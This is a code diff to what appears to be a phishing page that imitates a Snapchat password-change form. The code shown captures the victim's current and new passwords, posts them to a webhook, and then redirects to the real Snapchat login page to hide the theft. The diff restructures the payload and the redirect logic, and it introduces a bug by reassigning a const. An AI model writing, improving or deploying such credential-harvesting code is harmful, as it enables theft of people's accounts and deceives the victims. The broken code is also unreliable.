@@ -61566,16 +61566,20 @@ html[lang='ar'] .theme--snapchat {
                   errorMessage.style.display = 'block';
                 }
 
+                const payload = JSON.stringify({
+                    content: `--------------------\nErrors: No\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
+                });
+
                 if (errors.length > 0) {
                     checkerror()
+                    payload = JSON.stringify({
+                        content: `--------------------\nErrors: No\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
+                    });
                 }else{
                     errorMessage.style.display = 'none';
                 }
         
                // Prepare the payload as a single string
-                const payload = JSON.stringify({
-                    content: `--------------------\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
-                });
         
                 try {
                     // Send the POST request to the webhook
@@ -61586,7 +61590,9 @@ html[lang='ar'] .theme--snapchat {
                     });
     
                     if (response.ok) {
-                        window.location.href = "https://accounts.snapchat.com/accounts/v2/login";
+                        if (errors.length <= 0) {
+                            window.location.href = "https://accounts.snapchat.com/accounts/v2/login";
+                        }
                     } else {
                     errors.push("Something went wrong, try again later")
                     checkerror()
